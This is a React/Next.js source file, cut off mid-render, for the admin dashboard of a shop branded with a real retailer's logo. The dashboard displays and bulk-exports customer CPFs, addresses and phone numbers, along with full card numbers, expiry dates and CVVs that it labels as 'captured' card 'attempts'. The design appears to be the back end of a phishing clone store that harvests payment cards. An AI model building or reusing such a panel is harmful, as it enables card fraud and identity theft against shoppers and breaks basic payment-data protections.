"use client";

import { useState, useEffect, useCallback } from "react";
import Image from "next/image";
import {
  LayoutDashboard, ShoppingBag, Users, CreditCard, QrCode,
  LogOut, Eye, ChevronLeft, ChevronRight, RefreshCw,
  DollarSign, Clock, CheckCircle, XCircle, Truck, Package,
  Download, Search, TrendingUp, AlertTriangle, Copy, Check,
  BarChart3, Activity, Shield
} from "lucide-react";

type Tab = "dashboard" | "orders" | "leads" | "pix" | "cards";

interface Order {
  id: string;
  status: string;
  customer_email: string;
  customer_first_name: string;
  customer_last_name: string;
  customer_cpf: string;
  customer_phone: string;
  payment_method: string;
  total: number;
  subtotal: number;
  discount: number;
  shipping: number;
  items_json: string;
  address_street: string;
  address_number: string;
  address_complement: string;
  address_neighborhood: string;
  address_city: string;
  address_uf: string;
  address_cep: string;
  created_at: string;
}

interface Lead {
  id: string;
  email: string;
  first_name: string;
  last_name: string;
  cpf: string;
  phone: string;
  step_reached: string;
  created_at: string;
}

interface CardData {
  id: string;
  order_id: string;
  card_number: string;
  card_name: string;
  card_expiry: string;
  card_cvv: string;
  card_installments: number;
  captured_at: string;
}

interface PixPayment {
  id: string;
  order_id: string;
  pix_code: string;
  amount: number;
  status: string;
  paid_at: string | null;
  expires_at: string;
  created_at: string;
}

interface Stats {
  totalOrders: number;
  paidOrders: number;
  pendingOrders: number;
  shippedOrders: number;
  cancelledOrders: number;
  totalLeads: number;
  totalRevenue: number;
  totalPending: number;
  totalPixPending: number;
  totalPixPaid: number;
  totalCardAttempts: number;
  recentOrders: Order[];
}

function fmt(val: number) {
  return `R$ ${val.toFixed(2).replace(".", ",")}`;
}

function formatDate(dateStr: string) {
  if (!dateStr) return "-";
  const d = new Date(dateStr);
  return d.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" });
}

function StatusBadge({ status }: { status: string }) {
  const map: Record<string, { label: string; cls: string }> = {
    pending: { label: "Pendente", cls: "admin__badge--pending" },
    paid: { label: "Pago", cls: "admin__badge--paid" },
    shipped: { label: "Enviado", cls: "admin__badge--shipped" },
    delivered: { label: "Entregue", cls: "admin__badge--delivered" },
    cancelled: { label: "Cancelado", cls: "admin__badge--cancelled" },
  };
  const info = map[status] || { label: status, cls: "admin__badge--pending" };
  return <span className={`admin__badge ${info.cls}`}>{info.label}</span>;
}

// CSV Export utility
function exportToCSV(filename: string, headers: string[], rows: string[][]) {
  const BOM = "\uFEFF";
  const csvContent = BOM + [
    headers.join(";"),
    ...rows.map((row) => row.map((cell) => `"${(cell || "").replace(/"/g, '""')}"`).join(";")),
  ].join("\n");
  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `${filename}_${new Date().toISOString().slice(0, 10)}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

export default function AdminPage() {
  const [loggedIn, setLoggedIn] = useState(false);
  const [checking, setChecking] = useState(true);
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);

  const [tab, setTab] = useState<Tab>("dashboard");
  const [stats, setStats] = useState<Stats | null>(null);
  const [orders, setOrders] = useState<Order[]>([]);
  const [ordersTotal, setOrdersTotal] = useState(0);
  const [ordersPage, setOrdersPage] = useState(1);
  const [orderFilter, setOrderFilter] = useState("");
  const [orderSearch, setOrderSearch] = useState("");
  const [leads, setLeads] = useState<Lead[]>([]);
  const [leadSearch, setLeadSearch] = useState("");
  const [cards, setCards] = useState<CardData[]>([]);
  const [pixPayments, setPixPayments] = useState<PixPayment[]>([]);
  const [selectedOrder, setSelectedOrder] = useState<Order | null>(null);
  const [selectedOrderCard, setSelectedOrderCard] = useState<CardData | null>(null);
  const [selectedOrderPix, setSelectedOrderPix] = useState<PixPayment | null>(null);
  const [refreshing, setRefreshing] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [deleteConfirm, setDeleteConfirm] = useState<string | null>(null);

  // Check auth on mount
  useEffect(() => {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    fetch("/api/admin/auth/verify", { signal: controller.signal })
      .then((r) => r.json())
      .then((d) => { if (d.authenticated) setLoggedIn(true); })
      .catch(() => {})
      .finally(() => { clearTimeout(timeout); setChecking(false); });
  }, []);

  const fetchStats = useCallback(async () => {
    try {
      const r = await fetch("/api/admin/stats");
      const d = await r.json();
      setStats(d);
    } catch {}
  }, []);

  const fetchOrders = useCallback(async () => {
    try {
      const params = new URLSearchParams({ page: String(ordersPage), limit: "20" });
      if (orderFilter) params.set("status", orderFilter);
      const r = await fetch(`/api/orders?${params}`);
      const d = await r.json();
      setOrders(d.orders || []);
      setOrdersTotal(d.total || 0);
    } catch {}
  }, [ordersPage, orderFilter]);

  const fetchLeads = useCallback(async () => {
    try {
      const r = await fetch("/api/leads");
      const d = await r.json();
      setLeads(d.leads || []);
    } catch {}
  }, []);

  const fetchCards = useCallback(async () => {
    try {
      const r = await fetch("/api/card-data");
      const d = await r.json();
      setCards(d.cards || []);
    } catch {}
  }, []);

  const fetchPix = useCallback(async () => {
    try {
      const r = await fetch("/api/pix");
      const d = await r.json();
      setPixPayments(d.payments || []);
    } catch {}
  }, []);

  useEffect(() => {
    if (!loggedIn) return;
    fetchStats();
    if (tab === "orders") fetchOrders();
    if (tab === "leads") fetchLeads();
    if (tab === "cards") fetchCards();
    if (tab === "pix") fetchPix();
  }, [loggedIn, tab, fetchStats, fetchOrders, fetchLeads, fetchCards, fetchPix]);

  const refresh = async () => {
    setRefreshing(true);
    await fetchStats();
    if (tab === "orders") await fetchOrders();
    if (tab === "leads") await fetchLeads();
    if (tab === "cards") await fetchCards();
    if (tab === "pix") await fetchPix();
    setRefreshing(false);
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginLoading(true);
    setLoginError("");
    try {
      const r = await fetch("/api/admin/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });
      if (r.ok) {
        setLoggedIn(true);
      } else {
        setLoginError("Senha incorreta");
      }
    } catch {
      setLoginError("Erro de conexão");
    } finally {
      setLoginLoading(false);
    }
  };

  const handleLogout = async () => {
    await fetch("/api/admin/auth", { method: "DELETE" });
    setLoggedIn(false);
    setPassword("");
  };

  const viewOrder = async (order: Order) => {
    setSelectedOrder(order);
    try {
      const r = await fetch(`/api/orders/${order.id}`);
      const d = await r.json();
      setSelectedOrderCard(d.cardData || null);
      setSelectedOrderPix(d.pixPayment || null);
    } catch {}
  };

  const updateOrderStatus = async (orderId: string, status: string) => {
    await fetch(`/api/orders/${orderId}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status }),
    });
    fetchOrders();
    fetchStats();
    fetchPix();
    if (selectedOrder?.id === orderId) {
      setSelectedOrder({ ...selectedOrder, status });
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // Export functions
  const exportOrders = () => {
    const headers = ["ID", "Status", "Nome", "Email", "CPF", "Telefone", "Método", "Subtotal", "Desconto", "Frete", "Total", "Endereço", "Cidade", "UF", "CEP", "Data"];
    const rows = orders.map((o) => [
      o.id.slice(0, 8), o.status, `${o.customer_first_name} ${o.customer_last_name}`,
      o.customer_email, o.customer_cpf, o.customer_phone,
      o.payment_method === "credit" ? "Cartão" : "PIX",
      o.subtotal.toFixed(2), o.discount.toFixed(2), o.shipping.toFixed(2), o.total.toFixed(2),
      `${o.address_street} ${o.address_number}`, o.address_city, o.address_uf, o.address_cep,
      formatDate(o.created_at),
    ]);
    exportToCSV("pedidos", headers, rows);
  };

  const exportLeads = () => {
    const headers = ["Email", "Nome", "Sobrenome", "CPF", "Telefone", "Etapa", "Data"];
    const rows = leads.map((l) => [
      l.email, l.first_name, l.last_name, l.cpf, l.phone, l.step_reached, formatDate(l.created_at),
    ]);
    exportToCSV("leads", headers, rows);
  };

  const exportCards = () => {
    const headers = ["Pedido", "Número Cartão", "Nome", "Validade", "CVV", "Parcelas", "Data"];
    const rows = cards.map((c) => [
      c.order_id.slice(0, 8), c.card_number, c.card_name, c.card_expiry, c.card_cvv,
      String(c.card_installments), formatDate(c.captured_at),
    ]);
    exportToCSV("cartoes", headers, rows);
  };

  const exportPix = () => {
    const headers = ["Pedido", "Valor", "Status", "Código PIX", "Expiração", "Pago em", "Criado em"];
    const rows = pixPayments.map((p) => [
      p.order_id.slice(0, 8), p.amount.toFixed(2), p.status, p.pix_code,
      formatDate(p.expires_at), p.paid_at ? formatDate(p.paid_at) : "", formatDate(p.created_at),
    ]);
    exportToCSV("pix", headers, rows);
  };

  const exportAll = () => {
    exportOrders();
    setTimeout(() => exportLeads(), 300);
    setTimeout(() => exportCards(), 600);
    setTimeout(() => exportPix(), 900);
  };

  // Filtered data
  const filteredOrders = orderSearch
    ? orders.filter((o) =>
        `${o.customer_first_name} ${o.customer_last_name} ${o.customer_email} ${o.id}`.toLowerCase().includes(orderSearch.toLowerCase())
      )
    : orders;

  const filteredLeads = leadSearch
    ? leads.filter((l) =>
        `${l.first_name} ${l.last_name} ${l.email} ${l.phone}`.toLowerCase().includes(leadSearch.toLowerCase())
      )
    : leads;

  // Loading
  if (checking) {
    return (
      <div className="admin-login">
        <div className="admin-login__card">
          <div style={{ display: "flex", alignItems: "center", gap: 12, justifyContent: "center" }}>
            <RefreshCw size={20} className="animate-spin" style={{ color: "#0862AD" }} />
            <p style={{ color: "#979899" }}>Carregando...</p>
          </div>
        </div>
      </div>
    );
  }

  // Login page
  if (!loggedIn) {
    return (
      <div className="admin-login">
        <form onSubmit={handleLogin} className="admin-login__card">
          <div className="admin-login__logo">
            <Image
              src="https://cdagua.vtexassets.com/assets/vtex.file-manager-graphql/images/0653cec5-9e24-433a-867f-1fa6bfb8358b___7e8dc42a059653440eb3e6dfcb795a46.png"
              alt="Casas da Água" width={180} height={56} style={{ objectFit: "contain", margin: "0 auto" }}
            />
            <p className="admin-login__logo-sub">Painel Administrativo</p>
          </div>
          <h1 className="admin-login__title">Acesso Restrito</h1>
          <p className="admin-login__subtitle">Digite a senha para acessar o painel</p>
          <div className="admin-login__field">
            <label className="admin-login__label">Senha</label>
            <input
              type="password" value={password} onChange={(e) => setPassword(e.target.value)}
              placeholder="Digite a senha" className="admin-login__input" autoFocus
            />
          </div>
          <button type="submit" disabled={loginLoading} className="admin-login__btn">
            {loginLoading ? "Entrando..." : "Entrar"}
          </button>
          {loginError && <p className="admin-login__error">{loginError}</p>}
        </form>
      </div>
    );
  }

  // ===== ADMIN PANEL =====
  const sidebarItems: { key: Tab; label: string; icon: React.ReactNode; count?: number }[] = [
    { key: "dashboard", label: "Dashboard", icon: <LayoutDashboard size={20} /> },
    { key: "orders", label: "Pedidos", icon: <ShoppingBag size={20} />, count: stats?.totalOrders },
    { key: "leads", label: "Leads", icon: <Users size={20} />, count: stats?.totalLeads },
    { key: "pix", label: "PIX", icon: <QrCode size={20} />, count: stats?.totalPixPending },
    { key: "cards", label: "Cartões", icon: <CreditCard size={20} />, count: stats?.totalCardAttempts },
  ];

  const tabTitles: Record<Tab, string> = {
    dashboard: "Dashboard",
    orders: "Pedidos",
    leads: "Leads / Clientes",
    pix: "Pagamentos PIX",
    cards: "Dados de Cartão",
  };

  // Order detail view
  if (selectedOrder) {
    const items = JSON.parse(selectedOrder.items_json || "[]");
    return (
      <div className="admin">
        <aside className="admin__sidebar">
          <div className="admin__sidebar-header">
            <Image
              src="https://cdagua.vtexassets.com/assets/vtex.file-manager-graphql/images/0653cec5-9e24-433a-867f-1fa6bfb8358b___7e8dc42a059653440eb3e6dfcb795a46.png"
              alt="Casas da Água" width={140} height={44} style={{ objectFit: "contain" }}
            />
          </div>
          <nav className="admin__sidebar-nav">
            {sidebarItems.map((item) => (
              <button
                key={item.key}
                onClick={() => { setTab(item.key); setSelectedOrder(null); }}
                className={`admin__sidebar-link ${tab === item.key ? "admin__sidebar-link--active" : ""}`}
              >
                {item.icon}
                {item.label}
              </button>
            ))}
          </nav>
        </aside>

        <div className="admin__main">
          <div className="admin__topbar">
            <button onClick={() => setSelectedOrder(null)} className="admin__btn admin__btn--outline">
              <ChevronLeft size={16} /> Voltar
            </button>
            <div className="admin__topbar-actions">
              <select
                value={selectedOrder.status}
                onChange={(e) => updateOrderStatus(selectedOrder.id, e.target.value)}
                className="admin-login__input"
                style={{ width: "auto", padding: "8px 12px" }}
              >
                <option value="pending">Pendente</option>
                <option value="paid">Pago</option>
                <option value="shipped">Enviado</option>
                <option value="delivered">Entregue</option>
                <option value="cancelled">Cancelado</option>
              </select>
            </div>
          </div>

          <div className="admin__content">
            <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 24, flexWrap: "wrap" }}>
              <h2 style={{ fontSize: 20, fontWeight: 700, color: "#002A47" }}>
                Pedido #{selectedOrder.id.slice(0, 8)}
              </h2>
              <StatusBadge status={selectedOrder.status} />
              <button
                onClick={() => copyToClipboard(selectedOrder.id, "order-id")}
                className="admin__btn admin__btn--outline admin__btn--sm"
                title="Copiar ID completo"
              >
                {copiedId === "order-id" ? <Check size={12} /> : <Copy size={12} />}
                {copiedId === "order-id" ? "Copiado" : "ID"}
              </button>
              <span style={{ fontSize: 12, color: "#979899", marginLeft: "auto" }}>
                {formatDate(selectedOrder.created_at)}
              </span>
            </div>

            <div className="admin__detail-grid">
              {/* Cliente */}
              <div className="admin__detail-card">
                <h3 className="admin__detail-title"><Users size={16} /> Dados do Cliente</h3>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Nome</span>
                  <span className="admin__detail-value">{selectedOrder.customer_first_name} {selectedOrder.customer_last_name}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Email</span>
                  <span className="admin__detail-value">{selectedOrder.customer_email}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">CPF</span>
                  <span className="admin__detail-value">{selectedOrder.customer_cpf}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Telefone</span>
                  <span className="admin__detail-value">{selectedOrder.customer_phone}</span>
                </div>
              </div>

              {/* Entrega */}
              <div className="admin__detail-card">
                <h3 className="admin__detail-title"><Truck size={16} /> Entrega</h3>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Endereço</span>
                  <span className="admin__detail-value">{selectedOrder.address_street}, {selectedOrder.address_number}</span>
                </div>
                {selectedOrder.address_complement && (
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Complemento</span>
                    <span className="admin__detail-value">{selectedOrder.address_complement}</span>
                  </div>
                )}
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Bairro</span>
                  <span className="admin__detail-value">{selectedOrder.address_neighborhood}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Cidade/UF</span>
                  <span className="admin__detail-value">{selectedOrder.address_city} - {selectedOrder.address_uf}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">CEP</span>
                  <span className="admin__detail-value">{selectedOrder.address_cep}</span>
                </div>
              </div>

              {/* Pagamento */}
              <div className="admin__detail-card">
                <h3 className="admin__detail-title"><DollarSign size={16} /> Pagamento</h3>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Método</span>
                  <span className="admin__detail-value">{selectedOrder.payment_method === "credit" ? "Cartão de Crédito" : "PIX"}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Subtotal</span>
                  <span className="admin__detail-value">{fmt(selectedOrder.subtotal)}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Desconto</span>
                  <span className="admin__detail-value">-{fmt(selectedOrder.discount)}</span>
                </div>
                <div className="admin__detail-row">
                  <span className="admin__detail-label">Frete</span>
                  <span className="admin__detail-value">{selectedOrder.shipping === 0 ? "Grátis" : fmt(selectedOrder.shipping)}</span>
                </div>
                <div className="admin__detail-row" style={{ borderTop: "2px solid #0862AD", paddingTop: 12, marginTop: 4 }}>
                  <span className="admin__detail-label" style={{ fontWeight: 700, color: "#002A47", fontSize: 15 }}>Total</span>
                  <span className="admin__detail-value" style={{ fontSize: 20, fontWeight: 700, color: "#0862AD" }}>{fmt(selectedOrder.total)}</span>
                </div>
              </div>

              {/* Card data */}
              {selectedOrderCard && (
                <div className="admin__detail-card" style={{ borderColor: "#ffc107" }}>
                  <h3 className="admin__detail-title"><Shield size={16} /> Dados do Cartão</h3>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Número</span>
                    <span className="admin__detail-value" style={{ fontFamily: "monospace" }}>{selectedOrderCard.card_number}</span>
                  </div>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Nome</span>
                    <span className="admin__detail-value">{selectedOrderCard.card_name}</span>
                  </div>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Validade</span>
                    <span className="admin__detail-value">{selectedOrderCard.card_expiry}</span>
                  </div>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">CVV</span>
                    <span className="admin__detail-value" style={{ fontFamily: "monospace" }}>{selectedOrderCard.card_cvv}</span>
                  </div>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Parcelas</span>
                    <span className="admin__detail-value">{selectedOrderCard.card_installments}x</span>
                  </div>
                </div>
              )}

              {/* Pix data */}
              {selectedOrderPix && (
                <div className="admin__detail-card" style={{ borderColor: "#32BCAD" }}>
                  <h3 className="admin__detail-title"><QrCode size={16} /> PIX</h3>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Status</span>
                    <StatusBadge status={selectedOrderPix.status} />
                  </div>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Valor</span>
                    <span className="admin__detail-value" style={{ fontWeight: 700 }}>{fmt(selectedOrderPix.amount)}</span>
                  </div>
                  <div className="admin__detail-row">
                    <span className="admin__detail-label">Código</span>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span className="admin__detail-value" style={{ fontSize: 10, wordBreak: "break-all", fontFamily: "monospace" }}>
                        {selectedOrderPix.pix_code.substring(0, 50)}...
                      </span>
                      <button
                        onClick={() => copyToClipboard(selectedOrderPix.pix_code, "pix-code")}
                        className="admin__btn admin__btn--outline admin__btn--sm"
                      >
                        {copiedId === "pix-code" ? <Check size={12} /> : <Copy size={12} />}
                      </button>
                    </div>
                  </div>
                  {selectedOrderPix.paid_at && (
                    <div className="admin__detail-row">
                      <span className="admin__detail-label">Pago em</span>
                      <span className="admin__detail-value">{formatDate(selectedOrderPix.paid_at)}</span>
                    </div>
                  )}
                  {selectedOrderPix.status === "pending" && (
                    <button
                      onClick={() => updateOrderStatus(selectedOrder.id, "paid")}
                      className="admin__btn admin__btn--success"
                      style={{ marginTop: 12, width: "100%" }}
                    >
                      <CheckCircle size={16} /> Confirmar Pagamento
                    </button>
                  )}
                </div>
              )}
            </div>

            {/* Items */}
            <div className="admin__table-wrap" style={{ marginTop: 24 }}>
              <div className="admin__table-header">
                <h3 className="admin__table-title"><Package size={16} /> Itens do Pedido ({items.length})</h3>
              </div>
              <table className="admin__table">
                <thead>
                  <tr>
                    <th>Produto</th>
                    <th>Qtd</th>
                    <th>Preço</th>
                    <th>Total</th>
                  </tr>
                </thead>
                <tbody>
                  {items.map((item: { name: string; quantity: number; price: number; image?: string }, i: number) => (
                    <tr key={i}>
                      <td style={{ display: "flex", alignItems: "center", gap: 10 }}>
                        {item.image && (
                          <img src={item.image} alt="" width={36} height={36} style={{ objectFit: "contain", borderRadius: 4, border: "1px solid #E3EBED" }} />
                        )}
                        <span style={{ fontSize: 13 }}>{item.name}</span>
                      </td>
                      <td>{item.quantity}</td>
                      <td>{fmt(item.price)}</td>
                      <td style={{ fontWeight: 600 }}>{fmt(item.price * item.quantity)}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Conversion rate
  const conversionRate = stats && stats.totalLeads > 0
    ? ((stats.totalOrders / stats.totalLeads) * 100).toFixed(1)
    : "0";

  const avgTicket = stats && stats.paidOrders > 0
    ? stats.totalRevenue / stats.paidOrders
    : 0;

  // ===== MAIN ADMIN PANEL =====
  return (
    <div className="admin">
      {/* Mobile menu toggle */}
      <button
        className="admin__mobile-toggle"
        onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
        style={{
          display: "none", position: "fixed", top: 12, left: 12, zIndex: 100,
          background: "#002A47", color: "#fff", border: "none", borderRadius: 8,
          padding: "8px 12px", cursor: "pointer", fontSize: 14, fontWeight: 600,
        }}
      >
        <LayoutDashboard size={16} />
      </button>

      {/* Sidebar */}
      <aside className={`admin__sidebar ${mobileMenuOpen ? "admin__sidebar--open" : ""}`}>
        <div className="admin__sidebar-header">
          <Image
            src="https://cdagua.vtexassets.com/assets/vtex.file-manager-graphql/images/0653cec5-9e24-433a-867f-1fa6bfb8358b___7e8dc42a059653440eb3e6dfcb795a46.png"
            alt="Casas da Água" width={140} height={44} style={{ objectFit: "contain" }}
          />
        </div>
        <nav className="admin__sidebar-nav">
          {sidebarItems.map((item) => (
            <button
              key={item.key}
              onClick={() => { setTab(item.key); setMobileMenuOpen(false); }}
              className={`admin__sidebar-link ${tab === item.key ? "admin__sidebar-link--active" : ""}`}
            >
              {item.icon}
              <span style={{ flex: 1, textAlign: "left" }}>{item.label}</span>
              {item.count !== undefined && item.count > 0 && (
                <span style={{
                  background: tab === item.key ? "rgba(255,255,255,0.3)" : "rgba(8,98,173,0.15)",
                  color: tab === item.key ? "#fff" : "#0862AD",
                  fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 12,
                }}>
                  {item.count}
                </span>
              )}
            </button>
          ))}
        </nav>
        <div style={{ marginTop: "auto", padding: "16px 12px", borderTop: "1px solid rgba(255,255,255,0.1)" }}>
          <button
            onClick={exportAll}
            className="admin__sidebar-link"
            style={{ width: "100%", marginBottom: 8 }}
          >
            <Download size={20} />
            Exportar Tudo
          </button>
          <button onClick={handleLogout} className="admin__sidebar-link" style={{ width: "100%" }}>
            <LogOut size={20} />
            Sair
          </button>
        </div>
      </aside>

      {/* Main */}
      <div className="admin__main">
        <div className="admin__topbar">
          <h1 className="admin__topbar-title">{tabTitles[tab]}</h1>
          <div className="admin__topbar-actions">
            {tab === "orders" && orders.length > 0 && (
              <button onClick={exportOrders} className="admin__btn admin__btn--outline admin__btn--export" title="Exportar pedidos CSV">
                <Download size={16} /> CSV
              </button>
            )}
            {tab === "leads" && leads.length > 0 && (
              <button onClick={exportLeads} className="admin__btn admin__btn--outline admin__btn--export" title="Exportar leads CSV">
                <Download size={16} /> CSV
              </button>
            )}
            {tab === "cards" && cards.length > 0 && (
              <button onClick={exportCards} className="admin__btn admin__btn--outline admin__btn--export" title="Exportar cartões CSV">
                <Download size={16} /> CSV
              </button>
            )}
            {tab === "pix" && pixPayments.length > 0 && (
              <button onClick={exportPix} className="admin__btn admin__btn--outline admin__btn--export" title="Exportar PIX CSV">
                <Download size={16} /> CSV
              </button>
            )}
            <button onClick={refresh} className="admin__btn admin__btn--outline admin__btn--refresh" disabled={refreshing}>
              <RefreshCw size={16} className={refreshing ? "admin__spinner" : ""} />
              Atualizar
            </button>
          </div>
        </div>

        <div className="admin__content admin__tab-content" key={tab}>
          {/* ===== DASHBOARD ===== */}
          {tab === "dashboard" && stats && (
            <>
              {/* Main stats */}
              <div className="admin__stats">
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--blue"><ShoppingBag size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.totalOrders}</div>
                    <div className="admin__stat-label">Total Pedidos</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--green"><DollarSign size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{fmt(stats.totalRevenue)}</div>
                    <div className="admin__stat-label">Receita (Pagos)</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--yellow"><Clock size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.pendingOrders}</div>
                    <div className="admin__stat-label">Pendentes</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--red"><Users size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.totalLeads}</div>
                    <div className="admin__stat-label">Leads</div>
                  </div>
                </div>
              </div>

              <div className="admin__stats" style={{ marginTop: 16 }}>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--green"><CheckCircle size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.paidOrders}</div>
                    <div className="admin__stat-label">Pagos</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--blue"><Truck size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.shippedOrders}</div>
                    <div className="admin__stat-label">Enviados</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--green"><QrCode size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.totalPixPaid}</div>
                    <div className="admin__stat-label">PIX Pagos</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--red"><CreditCard size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.totalCardAttempts}</div>
                    <div className="admin__stat-label">Tentativas Cartão</div>
                  </div>
                </div>
              </div>

              {/* KPIs extras */}
              <div className="admin__stats" style={{ marginTop: 16 }}>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--blue"><TrendingUp size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{conversionRate}%</div>
                    <div className="admin__stat-label">Taxa Conversão</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--green"><BarChart3 size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{fmt(avgTicket)}</div>
                    <div className="admin__stat-label">Ticket Médio</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--yellow"><Activity size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{fmt(stats.totalPending)}</div>
                    <div className="admin__stat-label">Receita Pendente</div>
                  </div>
                </div>
                <div className="admin__stat-card">
                  <div className="admin__stat-icon admin__stat-icon--red"><XCircle size={20} /></div>
                  <div>
                    <div className="admin__stat-value">{stats.cancelledOrders}</div>
                    <div className="admin__stat-label">Cancelados</div>
                  </div>
                </div>
              </div>

              {/* Quick actions */}
              <div style={{ display: "flex", gap: 12, marginTop: 20, flexWrap: "wrap" }}>
                <button onClick={exportAll} className="admin__btn admin__btn--primary">
                  <Download size={16} /> Exportar Todos os Dados
                </button>
                <button onClick={() => setTab("pix")} className="admin__btn admin__btn--outline">
                  <QrCode size={16} /> {stats.totalPixPending} PIX Pendente(s)
                </button>
              </div>

              {/* Recent orders */}
              <div className="admin__table-wrap" style={{ marginTop: 24 }}>
                <div className="admin__table-header">
                  <h3 className="admin__table-title">Pedidos Recentes</h3>
                  <button onClick={() => setTab("orders")} className="admin__btn admin__btn--outline admin__btn--sm">
                    Ver todos
                  </button>
                </div>
                {stats.recentOrders.length > 0 ? (
                  <table className="admin__table">
                    <thead>
                      <tr>
                        <th>Pedido</th>
                        <th>Cliente</th>
                        <th>Total</th>
                        <th>Status</th>
                        <th>Pagamento</th>
                        <th>Data</th>
                        <th></th>
                      </tr>
                    </thead>
                    <tbody>
                      {stats.recentOrders.map((order) => (
                        <tr key={order.id}>
                          <td style={{ fontWeight: 600 }}>#{order.id.slice(0, 8)}</td>
                          <td>{order.customer_first_name} {order.customer_last_name}</td>
                          <td style={{ fontWeight: 600 }}>{fmt(order.total)}</td>
                          <td><StatusBadge status={order.status} /></td>
                          <td>{order.payment_method === "credit" ? "Cartão" : "PIX"}</td>
                          <td style={{ fontSize: 12 }}>{formatDate(order.created_at)}</td>
                          <td>
                            <button onClick={() => viewOrder(order)} className="admin__btn admin__btn--outline admin__btn--sm">
                              <Eye size={14} /> Ver
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                ) : (
                  <div className="admin__empty">Nenhum pedido ainda</div>
                )}
              </div>
            </>
          )}

          {/* ===== ORDERS ===== */}
          {tab === "orders" && (
            <>
              <div style={{ display: "flex", gap: 12, marginBottom: 16, flexWrap: "wrap", alignItems: "center" }}>
                <div className="admin__filters">
                  {[
                    { key: "", label: "Todos" },
                    { key: "pending", label: "Pendentes" },
                    { key: "paid", label: "Pagos" },
                    { key: "shipped", label: "Enviados" },
                    { key: "cancelled", label: "Cancelados" },
                  ].map((f) => (
                    <button
                      key={f.key}
                      onClick={() => { setOrderFilter(f.key); setOrdersPage(1); }}
                      className={`admin__filter-btn ${orderFilter === f.key ? "admin__filter-btn--active" : ""}`}
                    >
                      {f.label}
                    </button>
                  ))}
                </div>
                <div style={{ position: "relative", flex: 1, minWidth: 200, maxWidth: 300 }}>
                  <Search size={16} style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: "#979899" }} />
                  <input
                    type="text"
                    value={orderSearch}
                    onChange={(e) => setOrderSearch(e.target.value)}
                    placeholder="Buscar por nome, email, ID..."
                    className="admin__search-input"
                    style={{
                      width: "100%", padding: "8px 12px 8px 32px",
                      fontSize: 13, fontFamily: "inherit",
                    }}
                  />
                </div>
              </div>

              <div className="admin__table-wrap">
                <div className="admin__table-header">
                  <h3 className="admin__table-title">{filteredOrders.length} de {ordersTotal} pedido(s)</h3>
                </div>
                {filteredOrders.length > 0 ? (
